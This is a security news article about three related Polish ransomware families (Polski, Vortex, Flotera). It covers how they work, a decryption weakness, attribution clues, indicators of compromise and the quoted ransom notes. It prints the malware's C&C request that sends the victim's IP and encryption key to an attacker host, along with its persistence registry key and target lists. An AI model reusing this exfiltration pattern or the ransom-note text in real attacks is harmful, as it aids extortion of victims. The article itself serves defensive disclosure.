@@ -1,0 +1,346 @@
+
+	   
+A malware author that loves Polish hip hop music appears to be behind the Polski, Vortex, and Flotera (spelled Ŧl๏tєгค) ransomware families that have made a small number of victims between January and March this year.
+
+All three ransomware families are related, and one evolved from the other. First on the scene was the Polski ransomware, which was first detected in live infections in late January - early February, albeit it took some time before a sample ended up in the hands of security researchers.
+
+
+Polski HTML ransom note (Michael Gilespie)
+
+Because Polski used a Sigaint email address to handle payments, and because the Sigaint email service went down in mid-February, the crook's operation was eventually hindered and they were bound to issue an update.
+
+Vortex takes Polski's place
+
+This update came in early March when GData security researcher Karsten Hahn came across Polski's next version, this time rebranded as the Vortex ransomware.
+
+
+1/1
+
+
+
+
+
+Skip Ad
+ 
+Continue watchingafter the adVisit Advertiser websiteGO TO PAGE.cnx-non-linear-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:none;width:100%;height:100%}.cnx-non-linear-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-non-linear-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-non-linear-ad-container .cnx-ad-slot video,.cnx-non-linear-ad-container video.cnx-ad-slot{background-color:unset}.cnx-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:#f4f4f4;width:100%;height:100%}.cnx-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-ad-container .cnx-ad-slot div{background-color:rgba(0,0,0,0) !important}.cnx-ad-container .cnx-ad-slot iframe{box-sizing:border-box;border:3px solid #fff !important;color-scheme:none}.cnx-ad-container .cnx-ad-slot iframe:not([id]){border:none !important}.cnx-ad-container .cnx-ad-slot-video-type iframe{border:none !important}.cnx-ad-container .cnx-ad-slot video,.cnx-ad-container video.cnx-ad-slot{background-color:#f4f4f4}Vortex used the same ransom note but replaced the Sigaint email address. The only visible change was that Vortex dropped the encryption price from $249 to $199.
+
+Polski's other features and mode of operation remained the same, according to security experts from Polish tech news site Zaufana Trzecia Strona (ZTS). An English version of the original article is also available on the publication's English site, Bad Cyber.
+
+According to researchers, the entire ransomware was based on AESxWin, a freeware encryption and decryption utility hosted on GitHub, and created by Egyptian software developer Eslam Hamouda.
+
+
+AESxWin legitimate app (Eslam Hamouda)
+
+The Polski malware author had made modifications to the AESxWin source code to account for the ransomware behavior.
+
+The behavior that stood out the most was that when users run the ransomware, it showed a popup asking if it should run at startup.
+
+
+Pre-run popup (ZTS)
+
+Pushing the Stop button here not only prevents the addition of a new Windows Registry entry that gives the ransomware boot persistence, but also stops the encryption process from starting altogether.
+
+Ransomware installed via vjw0rm RAT
+
+While you might be led to believe this is an ineptitude on the part of the ransomware's author, it is not such a glaring flaw.
+
+ZTS researchers claim the ransomware was not spread via email spam campaigns. Instead, they say the ransomware was dropped on infected computers after users had previously fallen victims to the vjw0rm, a remote access trojan (RAT) [1, 2].
+
+Researchers believe crooks are using the RAT to access a victim's computer and then install Polski/Vortex/Flotera by hand. This means the popup's presence is irrelevant, as crooks would ignore it. This explains why they didn't bother removing it from the modified AESxWin source code.
+
+Ransomware could be decrypted in certain circumstances
+
+Following this popup, the Polski/Vortex/Flotera encryption process starts. In its unaltered form, AESxWin works by taking an AES-256 key and encrypting/decrypting the user's files.
+
+In order to start the encryption process, the crook needs this initial encryption key. Low-level ransomware families sometimes come with a hard-coded key. Researchers usually find this encryption key and create free decrypters.
+
+Not wanting to make this mistake, but also not trusting to generate a key on the local computer, the crook makes an HTTP request to a public API and asks for a 40-character-long random alpha-numeric string, which it uses as the encryption key. The API's URL is:
+
+http://www.sethcardoza.com/api/rest/tools/random_password_generator/length:40/complexity:alphaNumeric
+
+Similarly, the ransomware makes another request to another public API that returns the user's IP address.
+
+https://api.ipify.org/
+
+All this information is packed neatly inside an HTTP GET request and sent to the crook's C&C server.
+
+GET /sss/post.php?IP=XXX.XXX.XXX.XXX&ID=a11a111a-1111-11e1-a111-a1aa1a1a11a1&Data=01-02-2017&Haslo=[ENCRYPTION_KEY] HTTP/1.1
+Host: wielkijopl.temp.swtest.ru
+Connection: Keep-Alive
+
+All data is sent in cleartext, with no encoding, and if the victim is using an application that logs network traffic, on the machine or on the network, he can find and extract the decryption key later on, and avoid paying the ransom demand.
+
+Because the ransomware author didn't bother removing all of AESxWin's features, there's even a right-click menu option that launches the decryption process.
+
+
+AESxWin / ransomware right-click menu option (ZTS)
+
+The actual encryption process targets only files in a selected list of folders. The folder list is:
+
+Environment.SpecialFolder.Personal
+Environment.SpecialFolder.Recent
+Environment.SpecialFolder.MyPictures
+Environment.SpecialFolder.MyMusic
+Environment.SpecialFolder.Favorites
+Environment.SpecialFolder.ProgramFiles
+Environment.SpecialFolder.DesktopDirectory
+Environment.SpecialFolder.System
+Environment.SpecialFolder.MyComputer
++ all HDD root folders (C:, D:, etc.)
+
+Theoretically, the ransomware should target the following file types. According to ZTS researchers, in practice, the ransomware only encrypts image files due to an unknown bug.
+
+  image_ext = new string[] { ".jpg", ".jpeg", ".png", ".gif", ".bmp" };
+  video_ext = new string[] { ".avi", ".flv", ".mov", ".mp4", ".mpg", ".rm", ".rmvb", ".mkv", ".swf", ".vob", ".wmv", ".3g2", ".3gp", ".asf", ".ogv" };
+  audio_ext = new string[] { ".mp3", ".wav", ".acc", ".ogg", ".amr", ".wma" };
+  document_ext = new string[] { ".pdf", ".txt", ".rtf", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx" };
+  compressed_ext = new string[] { ".zip", ".rar", ".7z", ".tar", ".gzip" };
+  code_ext = new string[] { ".cs", ".vb", ".java", ".py", ".rb", ".cpp", ".html", ".css", ".js" };
+
+Once the encryption process ends, the ransomware appends the .aes extension at the end of all encrypted files. A log of all encrypted files, including the first four characters of the encryption key is stored in a .log file in the folder:
+
+C:\ProgramData\Keyboard\
+
+
+Vortex ransom note (Karsten Hahn)
+
+Four days later after Vortex was found on Virus Total, MalwareHunter discovered Flotera, another rebrand, but mostly identical with Vortex, except its name and the fact it used a 120-characters-long encryption key, instead of 40, but generated through the same public API.
+
+According to data from ID-Ransomware, all three variants made a few dozens victims, all from Poland.
+
+Fan of Polish hip hop behind ransomware?
+
+But things didn't stop here. As ransomware binaries piled up and researchers had more evidence to analyze, ZTS started to gather clues on the ransomware's author, who they believe is a person that goes online by the nickname of Armaged0n. ZTS researchers say they found the names of various Polish hip hop songs, artists and a recording studio in several of the ransomware's strings.
+
+While attribution is never a 100% affair, clues in the ransomware's source code reveal that its author is a big fan of the Polish rap scene, similar to the music preferences of an amateur malware author active on infamous Hack Forums. But, to be fair, this attribution is based on shaky evidence, and should not be taken at face value, as more than one malware author is allowed to love Polish hip hop. Nevertheless, this could be the starting point of a law enforcement investigation.
+
+
+Araged0n Hack Forum profile (ZTS)
+
+IOCs:
+
+Polski contact methods:
+
+estion@sigaint.org
+rsapl@openmailbox.org
+GaduGadu number: 61621122
+
+Vortex contact methods:
+
+rsapl@openmailbox.org
+polskiransom@airmail.cc
+
+Vortex SHA256 hash:
+
+fd218e093741316782ec4ec89f520d2962a4f3850cb5b04f9c2c9fde567dc23b
+
+Flotera SHA256 hash:
+
+8ad4d1f7b46b5f6d28f3e4206a1263bdb88808f39061602bcca4d4e9e61170d0
+
+Registry key:
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run] “AESxWin”=”c:\\folder\\filename.exe”
+
+Network comms:
+
+http://www.sethcardoza.com/api/rest/tools/random_password_generator/length:40
+/complexity:alphaNumeric
+http://www.sethcardoza.com/api/rest/tools/random_password_generator/length:120/complexity:alphaNumeric
+https://api.ipify.org/
+wielkijopl.temp.swtest[.]ru
+
+Polski ransom note:
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+P O L S K I    R A N S O M W A R E
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+######################################################################################################################################################
+
+
+Nie możesz znaleźć potrzebnych plików na dysku twardym ?
+Zawartość Twoich plików jest nie do otwarcia?
+
+
+Jest to skutek działania programu który zaszyfrował większość Twoich danych przy pomocy silnego alogrytmu AES-256,
+używanego min. przez służby mundurowe do zatajania danych przesyłanych drogą elektroniczną.
+Twoje zdjęcia, faktury, bazy danych zostały zaszyfrowane !!
+
+Przeczytaj więcej o wirusach typu ransomware:
+http://trybawaryjny.pl/co-to-jest-cryptolocker-i-jak-sie-przed-nim-bronic/ - Cryptolocker co to jest i jak się przed nim bronić
+http://bitdefender.pl/ransomware-co-to-jest-i-jak-sie-przed-tym-chronic - Bitdefender.pl - Ransomware Co to Jest
+http://datablog.krollontrack.pl/2015/03/18/ransomware-placic-czy-nie-placic/ - Ransomware płacić czy nie płacić?
+
+
+Jedyna metoda aby odzyskać Twoje pliki to wykupienie od nas programu deszyfrującego wraz z
+jednorazowym kluczem wygenerowanym unikalnie dla Ciebie!
+
+
+######################################################################################################################################################
+
+
+W momencie gdy to czytasz całość jest już ukończona, wytypowane pliki zostały zaszyfrowane a sam wirus usunięty z Twojego komputera.
+Klucz składający się z kilkudziesięciu znaków potrzebny do odszyfrowania danych z dysku znajduje się w miejscu dostępnym tylko dla nas !
+
+
+Możesz w nieskończoność próbować instalacji kolejnych programów antywirusowych,
+Formatować system operacyjny to jednak nic nie zmieni !
+Jeśli nie zastosujesz się do naszych instukcji nie odzyskasz plików które były na dysku HDD.
+
+
+######################################################################################################################################################
+
+
+Gdy już postanowisz odzyskać swoje dane skontaktuj się z nami pod adrem e-mail: rsapl@openmailbox.org lub estion@sigaint.org 
+
+Możesz też napisać na Gadu-Gadu : 61621122 
+
+2 Pliki odszyfrujemy za darmo aby udowodnić że jesteśmy w stanie tego dokonać!
+Za resztę niestety musisz zapłacić !
+
+Cena za odszyfrowanie wszystkich plików: 249$ 
+Uwaga ! Nie marnuj czasu, czas to pieniądz za 72 godziny cena wzrośnie o 100%!
+
+
+######################################################################################################################################################
+
+Vortex ransom note (similar to Ŧl๏tєгค гคภร๏๓ฬคгє):
+
+ᏉᎾᏒᏆᎬx ᏒᎪᏁsᎾmᎳᎪᏒᎬ
+
+Nie możesz znaleźć potrzebnych plików na dysku twardym ? Zawartość Twoich plików jest nie do otwarcia? Jest to skutek działania programu który zaszyfrował większość Twoich danych przy pomocy silnego alogrytmu AES-256, używanego min. przez służby mundurowe do zatajania danych przesyłanych drogą elektroniczną. Jedyna metoda aby odzyskać Twoje pliki to wykupienie od nas programu deszyfrującego, wraz z jednorazowym kluczem wygenerowanym unikalnie dla Ciebie!
+Gdy już postanowisz odzyskać swoje dane skontaktuj się z nami pod adrem e - mail: rsapl@openmailbox.org lub polskiransom@airmail.cc
+2 Pliki odszyfrujemy za darmo aby udowodnić że jesteśmy w stanie tego dokonać, Za resztę niestety musisz zapłacić !
+Cena za odszyfrowanie wszystkich plików: 199$
+Uwaga !Nie marnuj czasu, czas to pieniądz za 4 dni cena wzrośnie o 100 % !
+IP=XXX.XXX.XXX.XXX ID=111111111-1111-1111-11111111111111111 Data=11-11-2017
+
+ 
+
+	   
+
+.ia_ad {
+    background-color: #f0f6ff;
+    width: 95%;
+    max-width: 800px;
+    margin: 15px auto;
+    border-radius: 8px;
+    border: 1px solid #d6ddee;
+    display: flex;
+    align-items: stretch;
+    padding: 0;
+    overflow: hidden;
+}
+
+.ia_lef {
+    flex: 1;
+    max-width: 200px;
+    height: auto;
+    display: flex;
+    align-items: stretch;
+}
+
+.ia_lef a {
+    display: flex;
+    width: 100%;
+    height: 100%;
+}
+
+
+.ia_lef a img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 8px 0 0 8px;
+    margin: 0;
+    display: block;
+}
+
+.ia_rig {
+    flex: 2;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.ia_rig h2 {
+    font-size: 17px !important;
+    font-weight: 700;
+    color: #333;
+    line-height: 1.4;
+    font-family: Georgia, "Times New Roman", Times, serif;
+    margin: 0 0 14px 0;
+}
+
+.ia_rig p {
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0 0 clamp(6px, 2vw, 14px) 0;
+}
+
+.ia_button {
+    background-color: #FFF;
+    border: 1px solid #3b59aa;
+    color: black;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 8px;
+    display: inline-block;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    padding: 10px 20px;
+    width: fit-content;
+}
+
+.ia_button a {
+    text-decoration: none;
+    color: inherit;
+    display: block;
+}
+
+@media (max-width: 600px) {
+    .ia_ad {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .ia_lef {
+        max-width: 100%;
+    }
+
+    .ia_lef a img {
+        border-radius: 8px 8px 0 0;
+    }
+
+
+    .ia_rig {
+        padding: 15px;
+        width: 100%;
+    }
+
+    .ia_button {
+        width: 100%;
+	margin: 0px auto;
+    }
+}
+
+    
+        
+            
+    
+    
+        Red Report 2025: Analyzing the Top ATT&CK Techniques Used by 93% of Malware 
+Malware targeting password stores surged 3X as attackers executed stealthy Perfect Heist scenarios, infiltrating and exploiting critical systems.
+Discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.
+        Read the Red Report 2025
+    
+
+
+            
+	  
